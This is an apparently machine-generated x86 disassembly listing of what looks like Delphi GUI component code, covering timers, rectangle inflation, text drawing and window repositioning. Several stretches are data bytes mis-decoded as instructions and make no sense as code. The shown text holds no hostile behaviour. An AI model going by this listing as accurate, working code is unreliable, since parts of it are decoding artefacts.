add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or [ edi + 0x6e ] ecx
outsb
inc ebp
js r-xdata
adc [ ecx ] al
outsd
ja r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push es
dec edi
pushad
jb r-xdata
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ ecx ] al
sub [ edx ] al
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002d ] al
outsb
inc esp
jb r-xdata
call 0x2418cab
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c9b0
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d138
pop ebx
mov esp ebp
pop ebp
retn
inc esp
jb r-xdata
lea edx [ ebp - 0x28 ]
call sub_41c9b0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
jb r-xdata
push ebx
je r-xdata
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
test al 0x70
inc ebx
add al ch
add [ eax ] eax
je r-xdata
jae r-xdata
popad
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x60 ] bp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d138
mov eax eax
loopne r-xdata
inc esp
outsd
arpl [ ebx + 0x18 ] bp
jb r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
inc ebx
add al 0x89
inc ebp
in al 0x8b
inc ebp
clc
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
sub_428e74
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c9b0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d138
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c9b0
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d138
pop ebx
mov esp ebp
pop ebp
retn
sub_428f38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41cabc
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_428e74
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_428f98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4193f0
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_429020
call sub_41a53c
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_428fe8
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_429094
mov eax [ esi + 0x34 ]
call sub_41a5f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41943c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_429020
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42905a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429094
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_429113
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42911a
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
sub_42916c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444030
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42bf68
call sub_42c048
test al al
je r-xdata
add esp 0xfffffff0
call sub_403530
mov edx 0xb9
mov eax esi
call sub_43b388
mov edx 0x29
mov eax esi
call sub_43b3ac
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_4295bc
mov edx 0x1
mov eax esi
call sub_4295d8
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_43bd6c
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_442660
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_429230
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f258
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4292a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4419e4
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_43f96c
sub_4292e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4293d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43bbcc
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4408a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293d7
lea eax [ ebp - 0x14 ]
call sub_403f5c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4423cc
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4423cc
push eax
call InvalidateRect
sub_4293e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_429418
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42957a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_428f38
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_4293e0
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_428f38
mov esi [ ebx + 0x208 ]
call sub_42bf68
call sub_42c048
test al al
je r-xdata
push ebp
call sub_4293e0
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_428f38
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41cc90
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41d034
mov eax ebx
call sub_4435ac
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_43dec4
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x1c ]
call sub_40441c
push eax
mov eax esi
call sub_41d530
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429581
lea eax [ ebp - 0x1c ]
call sub_403f5c
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41cdac
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41d450
mov edx r-xdata
mov eax esi
call sub_41d3ac
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42962c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e438
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_429684
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441060
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_4297a5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441060
call sub_403a44
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43b3ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43b388
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4297c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_442f14
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4297ec
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4435b4
pop esi
pop ebx
retn
sub_42982c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cdq
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0x42 ] al
add [ eax - 0x67 ] bl
inc edx
add [ edx + eax ] bl
add [ eax ] al
sbb ch bh
inc edx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + ebx * 4 ] dl
inc edx
add ah ah
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x4c00419b ] al
dec edi
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ch
dec edx
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
sub_429990
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_434f4c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_4137bc
xor edx edx
mov eax edi
call sub_43baec
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43bd40
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_429dc0
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_429a14
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413a5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43e21c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_429a4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_429ab1
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43524c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_429ab6
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429adc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4413b0
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403420
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_429b1c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4411f8
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403420
pop edx
pop esi
pop ebx
retn
sub_429b48
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_430e1c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_429df8
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_429bd8
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_429e6c
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403224
mov eax [ esi + 0x210 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44408c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_429c28
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41c4d8
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_429db1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4423cc
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43baec
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43b5d0
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_413918
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403420
test al al
je r-xdata
sub_429dc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413974
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43b7d8
mov eax ebx
mov si 0xffeb
call sub_403420
sub_429df8
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_429f70
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_429e6c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429990
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413a00
call sub_403224
pop edi
pop esi
pop ebx
retn
